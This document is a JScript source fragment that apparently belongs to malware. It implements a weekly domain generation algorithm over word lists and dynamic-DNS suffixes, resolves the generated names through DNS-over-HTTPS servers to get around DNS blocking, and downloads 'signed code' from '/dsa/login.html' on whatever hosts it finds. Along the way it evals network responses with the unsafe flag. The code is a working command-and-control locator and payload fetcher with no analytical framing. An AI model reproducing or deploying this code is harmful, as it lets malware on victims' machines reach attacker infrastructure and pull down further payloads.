function getDWCode() {
    var arrDoH = [
        "https://doh.dns.sb/dns-query",
        "https://doh1.blahdns.com/uncensor",
        "https://dns.rubyfish.cn/dns-query"
    ];
    var domainList = [
        ".ddns.net", ".ddnsking.com", ".3utilities.com", ".bounceme.net", ".freedynamicdns.net", ".freedynamicdns.org", ".gotdns.ch", ".hopto.org", ".myddns.me", ".myftp.biz", ".myftp.org", ".myvnc.com", ".onthewifi.com", ".redirectme.net", ".servebeer.com", ".serveblog.net", ".servecounterstrike.com", ".serveftp.com", ".servegame.com", ".servehalflife.com", ".servehttp.com", ".serveirc.com", ".serveminecraft.net", ".servemp3.com", ".servepics.com", ".servequake.com", ".sytes.net", ".viewdns.net", ".webhop.me", ".zapto.org", ".xyz", ".space", ".online", ".icu", ".cyou", ".site", ".top", ".website", ".work", ".monster", ".io", ".so"
    ];

    var ip;
    var domain = GetDomainHashByWeek(DateTime.Now);

    for (var i = 0; i < arrDoH.length; i++) {
        ip = resolveDoH(arrDoH[i], "google.com");

        if (!ip) continue;
        log("DoH test passed google.com resolved to: " + ip);

        for (var c = 0; c < domainList.length; c++) {
            log(
                "Resolving " + domain + domainList[c] + " on " + arrDoH[i] +
                "..."
            );
            ip = resolveDoH(arrDoH[i], domain + domainList[c]);

            if (!ip) continue;

            log(
                "IP resolved for " + domain + domainList[c] + " on " +
                arrDoH[i] + ": " + ip
            );

            var signedCode = getCodeFromDW(ip);

            if (signedCode) return signedCode;
        }
    }

    // if it got here is because it could not resolve yet

    for (var c = 0; c < domainList.length; c++) {
        log("Resolving " + domain + domainList[c] + "...");
        ip = resolveDNS(domain + domainList[c]);

        if (!ip) continue;

        log("IP resolved for " + domain + domainList[c] + ": " + ip);

        var signedCode = getCodeFromDW(ip);

        if (signedCode) return signedCode;
    }

    return false;
}

function resolveDoH(query, domain) {
    try {
        var json = (new WebClient()).DownloadString(
            query + "?name=" + domain + "&type=A"
        );

        json = "json = " + json;

        eval(eval("json", "unsafe"), "unsafe");

        if (!json) return false;
        if (!json.Answer) return false;
        if (!json.Answer[0]) return false;
        if (!json.Answer[0].data) return false;

        return json.Answer[0].data.Trim(".");
    } catch (error) {
        log("Error resolveDoH(): " + error);
    }
}

function GetDomainHashByWeek(dt) {
    var wordList1 = [
        "update", "system", "server", "game", "finan", "sistema", "esc", "servidor", "atualiza", "jogo", "internet", "servico", "service", "play", "comm", "hosting", "iphone", "samsung", "xiaomi", "motorola", "coin", "money", "fiat", "currency", "usa", "brasil", "deut", "espana", "tree", "apple", "adam", "eve", "lucifer", "satan", "demon", "angel", "break", "run", "playing", "stream", "cloud", "storage", "archive", "package", "upload", "submit", "send", "save", "counter", "strike", "steam", "discord", "left"
    ];

    var wordList2 = [
        "merc", "ven", "ear", "mar", "jup", "sat", "ura", "nep"
    ];

    var n = GetWeek(dt);
    var year = CultureInfo.InvariantCulture.Calendar.GetYear(dt);
    var word1 = wordList1[n % wordList1.length];
    var word2 = wordList2[n % wordList2.length];

    return word1 + word2 + year;
}

function getCodeFromDW(ip) {
    try {
        var content = (new WebClient()).DownloadString(
            "https://" + ip + "/dsa/login.html"
        );

        return getSignedCode(content);
    } catch (error) {
        log("Error getCodeFromDW(): " + error);
    }

    try {
        var content = (new WebClient()).DownloadString(
            "http://" + ip + "/dsa/login.html"
        );

        return getSignedCode(content);
    } catch (error) {
        log("Error getCodeFromDW(): " + error);
    }

    return false;
}

function resolveDNS(hostname) {
    try {
        var iph = Dns.Resolve(hostname);

        if (iph) {
            for (var i = 0; i < iph.AddressList.Length; i++) {
                return String(iph.AddressList[i]);
            }
        }
    } catch (error) {
        log("Error resolveDNS(): " + error);
    }

    return false;
}

